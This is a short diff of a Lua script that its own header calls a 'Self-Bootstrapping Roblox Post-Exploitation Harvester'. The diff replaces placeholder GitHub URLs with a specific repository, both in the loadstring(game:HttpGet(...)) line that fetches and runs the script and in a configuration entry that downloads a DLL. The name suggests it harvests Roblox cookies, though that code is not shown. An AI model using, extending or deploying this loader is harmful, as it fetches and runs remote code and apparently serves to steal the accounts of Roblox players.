@@ -1,7 +1,7 @@
 --=============================================================================
 --  CookieCutter.lua — Self-Bootstrapping Roblox Post-Exploitation Harvester
 --  Single file. Host on GitHub. Load with any executor:
---    loadstring(game:HttpGet("https://raw.githubusercontent.com/YOU/REPO/main/cookiecutter.lua"))()
+--    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptMaster101/CookieCutter/master/lua/cookiecutter.lua"))()
 --
 --  How it works:
 --    1. Detects executor capabilities
@@ -23,7 +23,7 @@ local CONFIG = {
     --  DLL download URL (GitHub raw or releases)
     --  Set to false to skip DLL entirely (pure-Lua mode only)
     -- ============================
-    dll_url = "https://raw.githubusercontent.com/YOU/CookieCutter/main/cookiecutter.dll",
+    dll_url = "https://raw.githubusercontent.com/ScriptMaster101/CookieCutter/master/cookiecutter.dll",
 
     -- ============================
     --  Phases to run
